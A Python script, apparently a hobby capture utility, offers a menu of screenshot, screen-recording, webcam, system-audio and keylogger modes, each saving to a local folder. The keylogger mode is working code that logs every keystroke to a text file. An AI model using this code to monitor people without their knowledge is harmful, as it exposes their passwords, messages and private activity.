from PIL import ImageGrab
from win32api import GetSystemMetrics
from pynput.keyboard import Listener, Key
import os
import time
import datetime                                                                             
import numpy as np 
import cv2
import soundcard as sc
import soundfile as sf
class CapturePro:

  def __init__(self):
    self.final_text = ""
    self.caps_lock_on = False
    print("1.SCREENSHOT")
    print("2.SCREEN RECORDER")
    print("3.VIDEO RECORDER")
    print("4.AUDIO RECORDER")
    print("5.KEYLOGGER")
    self.choice=int(input("Enter Your Choice: "))
    if self.choice==1:
      self.screenshot()
    elif self.choice==2:
      self.screenrecorder()
    elif self.choice==3:
      self.videorecorder()
    elif self.choice==4:
      self.audiorecorder()
    elif self.choice==5:
      self.keylogger()
    
  def screenshot(self): 
    screenno=int(input("How many screenshots you want to take: "))
    sec=int(input("How many secs after you wish to take screenshot: "))
    if os.path.exists("screenshotfolder"):
      pass
    else:
      os.mkdir("screenshotfolder")
    os.chdir("screenshotfolder")
    for i in range(screenno):
      screenshot = ImageGrab.grab()  # Capture the entire screen
      screenshot.save("screenshot"+str(i+1)+".png") # Save the screenshot to a file
      screenshot.close()  # Close the screenshot
      time.sleep(sec)


  def screenrecorder(self):
    print("-------SCREEN RECORDER STARTS---------")
    print("press ctrl + c to quit....")
    if os.path.exists("screenrecorderfolder"):
      pass

    else:
      os.mkdir("screenrecorderfolder")
    os.chdir("screenrecorderfolder")
    width = GetSystemMetrics(0)
    height = GetSystemMetrics(1)
    time_stamp = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')                  
    file_name = f'{time_stamp}.mp4'
    fourcc = cv2.VideoWriter_fourcc('m', 'p', '4', 'v')                                 
    captured_video = cv2.VideoWriter(file_name, fourcc, 20.0, (width, height))
    
    while True:
      try:
        img = ImageGrab.grab(bbox=(0, 0, width, height))                                  
        img_np = np.array(img) # convrting img as np array
        img_final = cv2.cvtColor(img_np, cv2.COLOR_BGR2RGB)                             
        captured_video.write(img_final)
      except KeyboardInterrupt:
        print("SCREEN RECORDED SUCCESSFULLY")
        break

  def videorecorder(self):
    print("-----VIDEO RECORDING STARTS-------")
    print("....Press ctrl + c to stop recording")
    if os.path.exists("videorecorderfolder"):
      pass
    else:
      os.mkdir("videorecorderfolder")
    os.chdir("videorecorderfolder")    
    time_stamp = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')                  
    filename=time_stamp+".mp4"
    vidobj=cv2.VideoCapture(0)
    fourcc=cv2.VideoWriter_fourcc('m','p','4','v')
    vidsaveobj=cv2.VideoWriter(filename,fourcc,20.0,(640,480))
    while True:
      try:
        ret,frame=vidobj.read()
        vidsaveobj.write(frame)
      except KeyboardInterrupt:
        print("Video Saved Successfully ")
        break
        
  def audiorecorder(self):
    rec_sec=int(input("Enter how many seconds you want to record the audio: "))
    print("-----AUDIO RECORDING STARTS------")
    print(".....Press ctrl + c to stop")
    if os.path.exists("audiorecorderfolder"):
      pass
    else:
      os.mkdir("audiorecorderfolder")
    os.chdir("audiorecorderfolder")    
    time_stamp = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')                  
    filename=time_stamp+".wav"
    samplerate = 48000            
    try:
      with sc.get_microphone(id=str(sc.default_speaker().name), include_loopback=True).recorder(samplerate=samplerate) as mic:
        data = mic.record(numframes=samplerate * rec_sec)
        sf.write(file=filename, data=data[:, 0], samplerate=samplerate)
    except KeyboardInterrupt:
      print("Audio recording stopped")
    finally:
      print("Audio Recorded successfully")
    

  def writing(self,key):
    global final_text,caps_lock_on
    current_text = str(key).replace("'", "")

    if current_text == "Key.space":
        self.final_text  += " "
    elif current_text == "Key.enter":
        self.final_text  += "\n"
    elif current_text == "Key.backspace":
       self.final_text  = self.final_text[:-1]
    elif current_text == "Key.shift":
        pass  
    elif current_text == "Key.tab":
        self.final_text  += "\t"
    elif current_text == "Key.caps_lock":
        self.caps_lock_on = not self.caps_lock_on  
    elif current_text.startswith("Key."):
        pass  
    else:
        if self.caps_lock_on:
            current_text = current_text.upper()
        self.final_text  += current_text

    with open("file.txt", "w") as f:
        f.write(self.final_text )
  def keylogger(self):
    
    if os.path.exists("keyloggerfolder"):
      pass
    else:
      os.mkdir("keyloggerfolder")
    os.chdir("keyloggerfolder")
    time.sleep(5)    
    print("------KEYLOGGER STARTS-------")
    print("Close the program to stop keylogger")

    with Listener(on_press=self.writing) as l:
      l.join() 
             
    
obj=CapturePro()
